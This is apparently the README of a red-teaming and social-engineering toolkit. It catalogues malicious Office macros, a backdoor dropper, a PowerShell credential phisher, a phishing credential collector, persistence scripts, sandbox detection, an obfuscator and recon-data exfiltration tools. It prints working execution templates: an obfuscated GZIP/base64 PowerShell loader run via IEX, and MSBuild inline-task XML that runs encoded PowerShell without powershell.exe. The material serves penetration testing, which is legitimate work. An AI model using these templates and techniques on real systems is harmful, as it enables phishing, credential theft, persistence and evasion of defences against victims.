## Red Teaming and Social-Engineering related scripts, tools and CheatSheets



- **`backdoor-drop.js`** - Internet Explorer - JavaScript trojan/backdoor dropper template, to be used during Penetration Testing assessments. ([gist](https://gist.github.com/mgeeky/b0aed7c1e510560db50f96604b150dac))

- **`clickOnceSharpPickTemplate.cs`** - This is a template for **C# Console Project** containing [SharpPick](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) technique of loading Powershell code from within C# application. The ClickOnce concept is to generate a windows self-updating Application that is specially privileged ([ClickOnce](https://www.slideshare.net/NetSPI/all-you-need-is-one-a-click-once-love-story-secure360-2015))

- **`compressedPowershell.py`** - Creates a Powershell snippet containing GZIP-Compressed payload that will get decompressed and executed (IEX)
. ([gist](https://gist.github.com/mgeeky/e30ceecc2082a11b99c7b24b42bd77fc))

    Example:

```
$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('H4sIAMkfcloC/3u/e390cGVxSWquXlBqWk5qcklmfp6eY3Fxam5STmWslZVPfmJKeGZJRkBiUUlmYo5fYm6qhhJUR3hmXkp+ebGeW35RbrGSpkKNgn9pia5faU6ONS9XNDZFer6pxcWJ6alO+RVAs4Mz8ss11D1LFMrzi7KLFdU1rQFOfXYfjwAAAA=='));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

- **`delete-warning-div-macro.vbs`** - VBA Macro function to be used as a Social Engineering trick removing "Enable Content" warning message as the topmost floating text box with given name. ([gist](https://gist.github.com/mgeeky/9cb6acdec31c8a70cc037c84c77a359c))

- **`Export-ReconData.ps1`** - Powershell script leveraging [PowerSploit Recon](https://github.com/PowerShellMafia/PowerSploit) module (PowerView) to save output from Reconnaissance cmdlets like `Get-*`, `Find-*` into _Clixml_ files. Those files (stored in an output directory as separate XML files) can later be extracted from attacked environment and loaded to a new powershell runspace using the same script. Very useful when we want to obtain as many data as possible, then exfiltrate that data, review it in our safe place and then get back to attacked domain for lateral spread. **Warning**: Be careful though, as this script launches many reconnaissance commands one by one, this WILL generate a lot of noise. Microsoft ATA for instance for sure pick you up with _"Reconnaissance using SMB session enumeration"_ after you've launched `Invoke-UserHunter`. 

    **WARNING:** This script is compatible with newer version of PowerView (coming from dev branch as of 2018),
    that exposed various `Get-Domain*`, `Find-*` cmdlets. In order to save recon's data from the older PowerView,
    refer to my `Save-ReconData.ps1` script in this directory.

    Exposed functions:
    - `Export-ReconData` - Launches many cmdlets and exports their Clixml outputs.
    - `Import-ReconData -DirName <DIR>` - Loads Clixml previously exported outputs and stores them in Global variables reachable when script terminates.
    - `Get-ReconData -DirName <DIR>` - Gets names of variables that were created and contains previously imported data.

```
PS E:\PowerSploit\Recon> Load-ReconData -DirName .\PowerView-12-18-2018-08-30-09
Loaded $FileFinderSearchSYSVol results.
Loaded $FileFinder results.
Loaded $ForeignGroup results.
Loaded $ForeignUser results.
Loaded $GPOLocation results.
Loaded $MapDomainTrust results.
Loaded $NetComputer results.
Loaded $NetDomain results.
Loaded $NetDomainController results.
Loaded $NetDomainTrust results.
Loaded $NetFileServer results.
Loaded $NetForest results.
Loaded $NetForestCatalog results.
Loaded $NetForestDomain results.
Loaded $NetForestTrust results.
Loaded $NetGPO results.
Loaded $NetGPOGroup results.
Loaded $NetGroup results.
Loaded $NetGroupMember results.
Loaded $NetLocalGroup results.
Loaded $NetLoggedon results.
Loaded $NetOU results.
Loaded $NetProcess results.
Loaded $NetRDPSession results.
Loaded $NetSession results.
Loaded $NetShare results.
Loaded $NetSite results.
Loaded $NetSubnet results.
Loaded $NetUserAdminCount results.
Loaded $NetUser results.
Loaded $ShareFinder results.
Loaded $StealthUserHunterShowAll results.
Loaded $UserHunterShowAll results.
```

- **`generateMSBuildPowershellXML.py`** - Powershell via MSBuild inline-task XML payload generation script - To be used during Red-Team assignments to launch Powershell payloads without using `powershell.exe` ([gist](https://gist.github.com/mgeeky/df9f313cfe468e56c59268b958319bcb))

    Example output **not minimized**:
    
```
C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py     Show-Msgbox.ps1

        :: Powershell via MSBuild inline-task XML payload generation script
        To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'
        Mariusz B. / mgeeky, <mb@binary-offensive.com>

[?] File not recognized as PE/EXE.

------------------------------------------------------------------------------------
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

  <!--  Based on Casey Smith work, Twitter: @subTee                              -->
  <!--  Automatically generated using `generateMSBuildPowershellXML.py` utility  -->
  <!--  by Mariusz B. / mgeeky <mb@binary-offensive.com>                         -->

  <Target Name="btLDoraXcZV">
    <hwiJYmWvD />
  </Target>
  <UsingTask TaskName="hwiJYmWvD" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class hwiJYmWvD : Task {
                public override bool Execute() {

                    byte[] payload = System.Convert.FromBase64String("JHMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFJOUxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbWZwNmVZM0Z4YW01U1RtV3NsWlZQZm1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZVczNVJickdTcGtLTmduOXBpYTVmYVU2T05TOVhORFpGZXI2cHhjV0o2YWxPK1JWQXM0TXo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKTs=");
                    string decoded = System.Text.Encoding.UTF8.GetString(payload);

                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();

                    Pipeline pipeline = runspace.CreatePipeline();
                    pipeline.Commands.AddScript(decoded);
                    pipeline.Invoke();

                    runspace.Close();
                    return true;
                }
            }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
------------------------------------------------------------------------------------
```
    
**minimized**
    
```
C:\Users\IEUser\Desktop\files\video>python generateMSBuildPowershellXML.py Show-Msgbox.ps1 -m                     
                                                                                                                  
        :: Powershell via MSBuild inline-task XML payload generation script                                       
        To be used during Red-Team assignments to launch Powershell payloads without using 'powershell.exe'       
        Mariusz B. / mgeeky, <mb@binary-offensive.com>                                                                
                                                                                                                  
[?] File not recognized as PE/EXE.                                                                                    
                                                                                                                  
------------------------------------------------------------------------------------                                  
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><Target Name="mYOYInAFWE"><DpaYaokgauWBJbe /></Target><UsingTask TaskName="DpaYaokgauWBJbe" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"><Task><Reference Include="System.Management.Automation" /><Code Type="Class" Language="cs"><![CDATA[using System.Management.Automation;using System.Management.Automation.Runspaces;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class DpaYaokgauWBJbe:Task{public override bool Execute(){byte[] x=System.Convert.FromBase64String("JHMgPSBOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSgsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFMQkxjbG9DLzN1L2UzOTBjR1Z4U1dxdVhsQnFXazVxY2tsbWZwNmVZM0Z4YW01U1RtV3NsWlZQZm1KS2VHWkpSa0JpVVVsbVlvNWZZbTZxaGhKVVIzaG1Ya3ArZWJHZVczNVJickdTcGtLTmduOXBpYTVmYVU2T05TOVhORFpGZXI2cHhjV0o2YWxPK1JWQXM0TXo4c3MxMUQxTEZNcnppN0tMRmRVMXJRRk9mWFlmandBQUFBPT0nKSk7IElFWCAoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKTs=");string d=System.Text.Encoding.UTF8.GetString(x);Runspace r=RunspaceFactory.CreateRunspace();r.Open();Pipeline p=r.CreatePipeline();p.Commands.AddScript(d);p.Invoke();r.Close();return true;}}]]></Code></Task></UsingTask></Project>                                                                                                     
------------------------------------------------------------------------------------                              
```

- **`Get-DomainOUTree.ps1`** - Collects OU lines returned from **PowerView's** `Get-NetOU`/`Get-DomainOU` cmdlet, and then prints that structure as a _Organizational Units tree_.

This scriptlet works with both older version of PowerView that got implemented `Get-NetOU` cmdlet, by passing its output via pipeline to `Get-NetOUTree`:

```
PS E:\PowerSploit\Recon> Get-NetOU | Get-NetOUTree
```

or with new version of PowerView coming with it's `Get-DomainOU` cmdlet.

```
PS E:\PowerSploit\Recon> Get-DomainOU | Get-DomainOUTree
+ CONTOSO
   + SharedFolders
   + Departments
      + IT
      + SALES
      + LAWYERS
      + CHIEFS
      + AUDIT
      + HR
   + Software
   + Computers
      + Workstations
      + Servers
         + Data
         + Infrastructure
         + SOC
   + Groups
   + Users
      + Partners
      + Employees
      + Admins
+ Domain Controllers
+ Microsoft Exchange Security Groups
```


- **`Invoke-Command-Cred-Example.ps1`** - Example of using PSRemoting with credentials passed directly from command line. ([gist](https://gist.github.com/mgeeky/de4ecf952ddce774d241b85cfbf97faf))

- **`MacroDetectSandbox.vbs`** - Visual Basic script responsible for detecting Sandbox environments, as presented in modern Trojan Droppers implemented in Macros. ([gist](https://gist.github.com/mgeeky/61e4dfe305ab719e9874ca442779a91d))

- **`Macro-Less-Cheatsheet.md`** - Macro-Less Code Execution in MS Office via DDE (Dynamic Data Exchange) techniques Cheat-Sheet ([gist](https://gist.github.com/mgeeky/981213b4c73093706fc2446deaa5f0c5))

- **`macro-psh-stdin-author.vbs`** - VBS Social Engineering Macro with Powershell invocation taking arguments from Author property and feeding them to StdIn. ([gist](https://gist.github.com/mgeeky/50c4b7fa22d930a80247fea62755fbd3))

- **`msbuild-powershell-msgbox.xml`** - Example of Powershell execution via MSBuild inline task XML file. On a simple Message-Box script.
 ([gist](https://gist.github.com/mgeeky/617c54a23f0c4e99e6f475e6af070810))

- **`muti-stage-1.md`** - Multi-Stage Penetration-Testing / Red Teaming Malicious Word document creation process. ([gist](https://gist.github.com/mgeeky/6097ea56e0f541aa7d98161e2aa76dfb))

- **`Phish-Creds.ps1`** - Powershell oneline Credentials Phisher - to be used in malicious Word Macros/VBA/HTA or other RCE commands on seized machine. ([gist](https://gist.github.com/mgeeky/a404d7f23c85954650d686bb3f02abaf))

    One can additionally add, right after `Get-Credential` following parameters that could improve pretext's quality during social engineering attempt:
    - `-Credential domain\username` - when we know our victim's domain and/or username - we can supply this info to the dialog
    - `-Message "Some luring sentence"` - to include some luring message

- [**`PhishingPost`**](https://github.com/mgeeky/PhishingPost) - (PHP Script intdended to be used during Phishing campaigns as a credentials collector linked to backdoored HTML <form> action parameter.

- [**`RobustPentestMacro`**](https://github.com/mgeeky/RobustPentestMacro) - This is a rich-featured Visual Basic macro code for use during Penetration Testing assignments, implementing various advanced post-exploitation techniques.


- **`Save-ReconData.ps1`** - Powershell script leveraging [PowerSploit Recon](https://github.com/PowerShellMafia/PowerSploit) module (PowerView) to save output from Reconnaissance cmdlets like `Get-*`, `Find-*` into _Clixml_ files. It differs from `Export-ReconData.ps1` in that it supports only older PowerView version from before 12 dec 2016. 
    Exposed functions:
    - `Save-ReconData` - Launches many cmdlets and exports their Clixml outputs.
    - `Load-ReconData -DirName <DIR>` - Loads Clixml previously exported outputs and stores them in Global variables reachable when script terminates.
    - `Get-ReconData -DirName <DIR>` - Gets names of variables that were created and contains previously imported data.

- **`set-handler.rc`** - Quickly set metasploit's multi-handler + web_delivery (separated) handler for use with powershell. ([gist](https://gist.github.com/mgeeky/bf4d732aa6e602ca9b77d089fd3ea7c9))

- **`SubstitutePageMacro.vbs`** - This is a template for the Malicious Macros that would like to substitute primary contents of the document (like luring/fake warnings to "Enable Content") and replace document's contents with what is inside of an AutoText named `RealDoc` (configured via variable `autoTextTemplateName` ). ([gist](https://gist.github.com/mgeeky/3c705560c5041ab20c62f41e917616e6))

- **`warnings\EN-Word.docx`** and **`warnings\EN-Excel.docx`**  - Set of ready-to-use Microsoft Office Word shapes that can be pasted / inserted into malicious documents for enticing user into clicking "Enable Editing" and "Enable Content" buttons.

- **`WMIPersistence.vbs`** - Visual Basic Script implementing WMI Persistence method (as implemented in SEADADDY malware and further documented by Matt Graeber) to make the Macro code schedule malware startup after roughly 3 minutes since system gets up. ([gist](https://gist.github.com/mgeeky/d00ba855d2af73fd8d7446df0f64c25a))

- **`Various-Macro-Based-RCEs.md`** - Various Visual Basic Macros-based Remote Code Execution techniques to get your meterpreter invoked on the infected machine. ([gist](https://gist.github.com/mgeeky/61e4dfe305ab719e9874ca442779a91d))

- **`vba-macro-mac-persistence.vbs`** - (WIP) Working on VBA-based MacPersistance functionality for MS Office for Mac Macros. ([gist](https://gist.github.com/mgeeky/dd184e7f50dfab5ac97b4855f23952bc))

- **`vba-windows-persistence.vbs`** - VBA Script implementing two windows persistence methods - via WMI EventFilter object and via simple Registry Run. ([gist](https://gist.github.com/mgeeky/07ffbd9dbb64c80afe05fb45a0f66f81))

- [**`VisualBasicObfuscator`**](https://github.com/mgeeky/VisualBasicObfuscator) - Visual Basic Code universal Obfuscator intended to be used during penetration testing assignments.
